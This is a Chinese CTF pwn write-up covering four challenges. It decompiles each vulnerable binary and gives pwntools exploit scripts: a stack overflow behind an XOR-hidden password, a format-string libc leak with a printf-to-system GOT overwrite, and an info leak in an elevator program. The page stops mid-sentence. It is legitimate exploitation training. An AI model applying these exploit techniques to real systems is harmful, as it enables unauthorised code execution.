    <content>
      <![CDATA[<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Sign-In"><a href="#Sign-In" class="headerlink" title="Sign In"></a>Sign In</h2><p>考查的是接收并进行算术运算，直接上exp：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TOTAL = 10 + 10 + 20                        # Round1 + Round2 + Round3<br><br>ARITH = re.compile(rb&#x27;Calculate (-?\d+) ([-+*]) (-?\d+): $&#x27;)<br>REV   = re.compile(rb&quot;Reverse the string &#x27;([A-Za-z]+)&#x27;: $&quot;)<br>SWAP  = re.compile(rb&quot;Swap the case of &#x27;([A-Za-z]+)&#x27;: $&quot;)<br>CAES  = re.compile(rb&quot;Caesar shift (\d+) on &#x27;([A-Za-z]+)&#x27;: $&quot;)<br><br><br>def answer_of(tail):<br>    &quot;&quot;&quot;tail = 已收到数据中最后一个 &#x27;\n&#x27; 之后的部分，即当前题面。&quot;&quot;&quot;<br>    m = ARITH.search(tail)<br>    if m:<br>        a, op, b = int(m[1]), m[2], int(m[3])<br>        return str(a + b if op == b&#x27;+&#x27; else a - b if op == b&#x27;-&#x27; else a * b).encode()<br>    m = REV.search(tail)<br>    if m:<br>        return m[1][::-1]<br>    m = SWAP.search(tail)<br>    if m:<br>        return m[1].swapcase()<br>    m = CAES.search(tail)<br>    if m:<br>        k, s = int(m[1]), m[2]<br>        return bytes((97 + (c - 97 + k) % 26) if 97 &lt;= c &lt;= 122<br>                     else (65 + (c - 65 + k) % 26) for c in s)<br>    return None<br><br><br>def main():<br>    for i in range(1, TOTAL + 1):<br>        pending = b&#x27;&#x27;<br>        try:<br>            while True:<br>                pending += io.recvuntil(b&#x27;: &#x27;)          # 题面与轮次提示都以 &quot;: &quot; 结尾<br>                ans = answer_of(pending.rsplit(b&#x27;\n&#x27;, 1)[-1])<br>                if ans is not None:<br>                    break<br>        except EOFError:<br>            log.failure(&#x27;connection closed at question %d/%d&#x27;, i, TOTAL)<br>            return<br>        io.sendline(ans)                                # 立即回包，抢 1s 窗口<br>        if i % 10 == 0:<br>            log.info(&#x27;answered %d/%d&#x27;, i, TOTAL)<br><br>    log.success(&#x27;all rounds passed -&gt; system(&quot;/bin/sh&quot;)&#x27;)<br>    io.sendline(b&#x27;cat /flag* flag* ./flag* 2&gt;/dev/null; echo SHELL_OK; id; pwd&#x27;)<br>    print(io.recvrepeat(3).decode(&#x27;latin-1&#x27;, &#x27;replace&#x27;))<br>    if sys.stdin.isatty():<br>        io.interactive()<br><br><br>if __name__ == &#x27;__main__&#x27;:<br>    main()<br></code></pre></td></tr></table></figure><h2 id="Ennead"><a href="#Ennead" class="headerlink" title="Ennead"></a>Ennead</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int hidden_maint()<br>&#123;<br>  int result; // eax<br>  char p_nptr[32]; // [rsp+0h] [rbp-20h] BYREF<br><br>  puts(&quot;[MAINT] maintenance channel opened.&quot;);<br>  puts(&quot;[MAINT] authorized maintainers only, all actions are logged.&quot;);<br>  printf(&quot;[MAINT] password&gt; &quot;);<br>  result = read_line(p_nptr, 32);<br>  if ( result &gt;= 0 )<br>  &#123;<br>    if ( check_pass(p_nptr) )<br>    &#123;<br>      puts(&quot;[MAINT] identity verified, maintenance session started.&quot;);<br>      maint_session = 1;<br>      result = emergency_unlock();<br>      maint_session = 0;<br>    &#125;<br>    else<br>    &#123;<br>      return puts(&quot;[MAINT] access denied, incident reported.&quot;);<br>    &#125;<br>  &#125;<br>  return result;<br>&#125;<br>int emergency_unlock()<br>&#123;<br>  int result; // eax<br>  char v1[64]; // [rsp+0h] [rbp-40h] BYREF<br><br>  puts(&quot;[MAINT] --- emergency unlock procedure ---&quot;);<br>  puts(&quot;[MAINT] cutting mains power to the magnetic lock ...&quot;);<br>  power_normal = 0;<br>  puts(&quot;[MAINT] enter your personal authorization code to proceed:&quot;);<br>  printf(&quot;[MAINT] code&gt; &quot;);<br>  gets(v1);<br>  result = printf(&quot;[MAINT] code rejected, power restored: \&quot;%s\&quot;\n&quot;, v1);<br>  power_normal = 1;<br>  return result;<br>&#125;<br></code></pre></td></tr></table></figure><p>存在栈溢出漏洞，但是想要利用这个漏洞，得先通过check_pass函数，进一步分析check_pass函数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">_BOOL8 __fastcall check_pass(const char *p_p_nptr)<br>&#123;<br>  size_t n; // rax<br>  char s2[40]; // [rsp+10h] [rbp-30h] BYREF<br>  unsigned __int64 n0x11; // [rsp+38h] [rbp-8h]<br><br>  for ( n0x11 = 0; n0x11 &lt;= 0x11; ++n0x11 )<br>    s2[n0x11] = enc_pass[n0x11] ^ 0x37;<br>  s2[n0x11] = 0;<br>  n = strlen(p_p_nptr);<br>  return strncmp(p_p_nptr, s2, n) == 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>也就说我们输入的字符串必须和enc_pass[n0x11] ^ 0x37的结果一样才能通过，那么再看一下enc_pass里面存放的是什么</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.rodata:0000000000402010 ; _BYTE enc_pass[18]<br>.rodata:0000000000402010 enc_pass        db 7Ah, 3, 5Eh, 59h, 43h, 4, 59h, 3, 59h, 54h, 4, 1Ah<br>.rodata:0000000000402010                                         ; DATA XREF: check_pass:loc_4016BA↑o<br>.rodata:000000000040201C                 db 64h, 4, 54h, 45h, 4, 43h<br></code></pre></td></tr></table></figure><p>那么就直接上exp了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">enc_pass = [0x7A, 3, 0x5E, 0x59, 0x43, 4, 0x59, 3, 0x59, 0x54, 4, 0x1A, 0x64, 4, 0x54, 0x45, 4, 0x43]<br>for i in range(len(enc_pass)):<br>    enc_pass[i] = enc_pass[i] ^ 0x37<br>print(bytes(enc_pass).decode())<br><br>sl(b&quot;9&quot;)<br>sl(b&quot;M4int3n4nc3-S3cr3t&quot;)<br><br>payload = cyclic(0x40 + 8) + p64(0x401853)<br>sl(payload)<br></code></pre></td></tr></table></figure><h2 id="Fortune"><a href="#Fortune" class="headerlink" title="Fortune"></a>Fortune</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">unsigned __int64 tell_fortune()<br>&#123;<br>  ssize_t v1; // [rsp+8h] [rbp-218h]<br>  char buf[520]; // [rsp+10h] [rbp-210h] BYREF<br>  unsigned __int64 v3; // [rsp+218h] [rbp-8h]<br><br>  v3 = __readfsqword(0x28u);<br>  printf(&quot;[FORTUNE] speak your wish&gt; &quot;);<br>  v1 = read(0, buf, 0x1FFu);<br>  if ( v1 &gt; 0 )<br>  &#123;<br>    if ( buf[v1 - 1] == 10 )<br>      buf[v1 - 1] = 0;<br>    else<br>      buf[v1] = 0;<br>    printf(&quot;[FORTUNE] your fortune: &quot;);<br>    printf(buf);<br>    putchar(10);<br>  &#125;<br>  return v3 - __readfsqword(0x28u);<br>&#125;<br></code></pre></td></tr></table></figure><p>存在格式化字符串漏洞，可以利用该漏洞泄露出canary的值与libc。首先找一下偏移是多少</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">pwndbg&gt; fmtarg 0x7fffffffcc20 <br>The index of format argument : 8 (\&quot;\%7$p\&quot;)<br>pwndbg&gt; fmtarg 0x7fffffffce28<br>The index of format argument : 73 (\&quot;\%72$p\&quot;)<br></code></pre></td></tr></table></figure><p>接着编写脚本进行泄漏（当然这道题目用不到canary），泄漏出后再利用格式化字符串漏洞将printf的got表修改为system函数地址，最后再到tell_fortune函数输入&#x2F;bin&#x2F;sh从而获取到shell。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">puts_got = elf.got[&#x27;puts&#x27;]<br>printf_got = elf.got[&#x27;printf&#x27;]<br><br>sl(b&quot;3&quot;)<br>payload = b&quot;aaaaa%10$s+%73$p&quot; + p64(puts_got)<br>sl(payload)<br>io.recvuntil(b&quot;aaaaa&quot;)<br>puts_addr = u64(io.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))<br>libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]<br>io.recvuntil(b&quot;+0x&quot;)<br>canary = int(io.recv(16), 16)<br>leak(&quot;libc_base&quot;, libc_base)<br>leak(&quot;canary&quot;, canary)<br><br>system_addr = libc_base + libc.sym[&#x27;system&#x27;]<br>payload_2 = fmtstr_payload(8, &#123;printf_got: system_addr&#125;)<br><br>sl(b&quot;3&quot;)<br>sl(payload_2)<br></code></pre></td></tr></table></figure><h2 id="BadElevator"><a href="#BadElevator" class="headerlink" title="BadElevator"></a>BadElevator</h2><p>一道比较有意思的题目，接下来一步一步分析。</p><p>首先因为开启了PIE、与canary保护，且程序内没有现成的后门函数，所以理应想到一个问题：该如何泄漏libc、基址、canary。经过分析发现，程序内部有一个show_log函数用于输出，那么是否可以利用该函数泄漏点什么呢？</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ssize_t show_log()<br>&#123;<br>  _BYTE buf[32]; // [rsp+10h] [rbp-20h] BYREF<br><br>  fwrite(&quot;log index&gt; &quot;, 1u, 0xBu, _bss_start);<br>  read(0, buf, 0x20u);<br>  write(1, &quot;log entry: &quot;, 0xBu);<br>  return write(1, buf, 0x38u);<br>&#125;<br></code></pre></td></tr></table></figure><p>但是如何进入到该函数，这又是一个问题，想要进入到show_log函数，就必须先进入enter_maint函数，但是要进入到enter_maint函数，就得先进行一个判断。这个cmd_eq函数的作用就是用户输入的字符串依次与0x2A进行异或后，判断值是否与所给字符串一致</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">if ( n4 == 4 &amp;&amp; cmd_eq((__int64)s_, &quot;GKCD^&quot;) )<br>        enter_maint();<br>        <br>_BOOL8 __fastcall cmd_eq(__int64 a1, const char *s)<br>&#123;<br>  size_t i; // [rsp+18h] [rbp-18h]<br>  size_t v4; // [rsp+20h] [rbp-10h]<br><br>  v4 = strlen(s);<br>  for ( i = 0; i &lt; v4; ++i )<br>  &#123;<br>    if ( (*(_BYTE *)(a1 + i) ^ 0x2A) != s[i] )<br>      return 0;<br>  &#125;<br>  return *(_BYTE *)(a1 + v4) == 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为s_是用户输入的，所以现在关键就是如何让n4的值为4。再进一步分析找到handle_call函数，只要满足里面的条件，就可以使得n4的值为4</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">unsigned __int64 handle_call()<br>&#123;<br>  int g_ev; // [rsp+Ch] [rbp-34h]<br>  char nptr[40]; // [rsp+10h] [rbp-30h] BYREF<br>  unsigned __int64 v3; // [rsp+38h] [rbp-8h]<br><br>  v3 = __readfsqword(0x28u);<br>  fwrite(&quot;floor&gt; &quot;, 1u, 7u, _bss_start);<br>  if ( (int)readline(nptr, 32) &gt;= 0 )<br>  &#123;<br>    g_ev = atoi(nptr);<br>    if ( g_ev &lt;= 20 &amp;&amp; g_ev &gt;= -3 )<br>    &#123;<br>      g_ev_1 = g_ev;<br>      ::g_ev = g_ev;<br>      n4 = 0;<br>      printf(&quot;arrived at floor %d\n&quot;, g_ev);<br>    &#125;<br>    else<br>    &#123;<br>      n4 = 4;<br>      g_ev_0 = g_ev;<br>      puts(&quot;!! HARD FAULT: out of range floor&quot;);<br>    &#125;<br>  &#125;<br>  return v3 - __readfsqword(0x28u);<br>&#125;<br></code></pre></td></tr></table></figure><p>那么就回过头来，怎么利用show_log函数进行泄漏出我们想要的东西。首先在该函数里面是没有设置canary的，因此这里泄漏不了canary的值，只能泄漏基址，发现了个问题，因为我们只能输入0x20个字节，而输入距离rbp也是0x20字节，但是会输出0x38字节，也就说这里一定会泄露出该函数的返回地址的值。所以可以利用这个得到基址，从而PIE保护就没有效果了。</p><p>接下来就是最关键的地方了，怎么打ret2libc获取shell。在程序中有一个函数rebuild_map</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">unsigned __int64 rebuild_map()<br>&#123;<br>  unsigned __int64 v0; // rax<br>  void *v1; // rsp<br>  _BYTE v3[12]; // [rsp+8h] [rbp-50h] BYREF<br>  int n64; // [rsp+14h] [rbp-44h]<br>  int n0x80; // [rsp+18h] [rbp-40h]<br>  int nbytes; // [rsp+1Ch] [rbp-3Ch]<br>  _BYTE *v7; // [rsp+20h] [rbp-38h]<br>  char nptr[40]; // [rsp+28h] [rbp-30h] BYREF<br>  unsigned __int64 v9; // [rsp+50h] [rbp-8h]<br><br>  v9 = __readfsqword(0x28u);<br>  fwrite(&quot;floor count&gt; &quot;, 1u, 0xDu, _bss_start);<br>  if ( (int)readline(nptr, 32) &gt;= 0 )<br>  &#123;<br>    n64 = atoi(nptr);<br>    if ( n64 &gt; 0 &amp;&amp; n64 &lt;= 64 )<br>    &#123;<br>      fwrite(&quot;write offset&gt; &quot;, 1u, 0xEu, _bss_start);<br>      if ( (int)readline(nptr, 32) &gt;= 0 )<br>      &#123;<br>        n0x80 = atoi(nptr);<br>        if ( (unsigned int)n0x80 &lt;= 0x80 )<br>        &#123;<br>          fwrite(&quot;write length&gt; &quot;, 1u, 0xEu, _bss_start);<br>          if ( (int)readline(nptr, 32) &gt;= 0 )<br>          &#123;<br>            nbytes = atoi(nptr);<br>            if ( nbytes &gt; 0 &amp;&amp; nbytes &lt;= 0x300 )<br>            &#123;<br>              v0 = 16 * ((4 * n64 + 23LL) / 0x10uLL);<br>              while ( v3 != &amp;v3[-(v0 &amp; 0xFFFFFFFFFFFFF000LL)] )<br>                ;<br>              v1 = alloca(v0 &amp; 0xFFF);<br>              if ( (v0 &amp; 0xFFF) != 0 )<br>                *(_QWORD *)&amp;v3[(v0 &amp; 0xFFF) - 8] = *(_QWORD *)&amp;v3[(v0 &amp; 0xFFF) - 8];<br>              v7 = v3;<br>              fwrite(&quot;map data&gt; &quot;, 1u, 0xAu, _bss_start);<br>              read(0, &amp;v7[n0x80], nbytes);<br>            &#125;<br>            else<br>            &#123;<br>              puts(&quot;bad length&quot;);<br>            &#125;<br>          &#125;<br>        &#125;<br>        else<br>        &#123;<br>          puts(&quot;bad offset&quot;);<br>        &#125;<br>      &#125;<br>    &#125;<br>    else<br>    &#123;<br>      puts(&quot;bad count&quot;);<br>    &#125;<br>  &#125;<br>  return v9 - __readfsqword(0x28u);<br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数大致的功能</p>]]>
    </content>
